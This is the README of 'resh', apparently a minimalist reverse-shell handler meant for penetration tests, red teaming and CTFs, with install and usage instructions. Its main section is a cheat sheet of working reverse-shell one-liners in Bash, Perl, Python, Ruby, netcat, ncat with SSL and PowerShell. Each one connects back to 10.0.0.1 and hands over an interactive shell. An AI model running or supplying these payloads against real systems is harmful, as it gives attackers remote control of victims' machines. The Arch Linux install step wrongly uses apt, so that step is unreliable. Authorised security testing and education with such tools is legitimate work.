# resh
### REverse Shell Handler
A simple and minimalistic post-exploitation tool to handle and interact with reverse shells. The server listens on two ports, default 80 and 443. The server handles SSL reverse shells as well. This is to facilitate penetration tests, red teaming exercises or CTFs.

### Installing
#### Dependencies
##### Debian/Ubuntu/Kali
```
$ apt install libssl-dev libreadline-dev
```
##### Arch Linux/Manjaro
```
$ apt install openssl readline
```
#### Downloading and compiling
```
$ git clone https://github.com/jlhk/resh
$ cd resh
$ make cert # Generating SSL certificates
$ make      # Compiling
```
### Reverse Shells
```
# Bash
bash -i >& /dev/tcp/10.0.0.1/80 0>&1

# Perl
perl -e 'use Socket;$i="10.0.0.1";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh 10.0.0.1 80

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 80 >/tmp/f

# SSL
ncat --ssl -e /bin/sh 10.0.0.1 443

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat --ssl 10.0.0.1 443 >/tmp/f

# Powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
### Usage
```
usage: ./resh [-hv] [-l port] [-L port] [-i] [-c cert] [-k key]

-l port         Listen port for no encryption. Default 80
-L port         Listen port for SSL encrypted traffic. Default 443
-k              SSL private key to use. Default ./certs/srv.key
-c              SSL cert to use. Default ./certs/srv.pem

Example:
        ./resh -c certs/srv.pem -k certs/srv.key
```
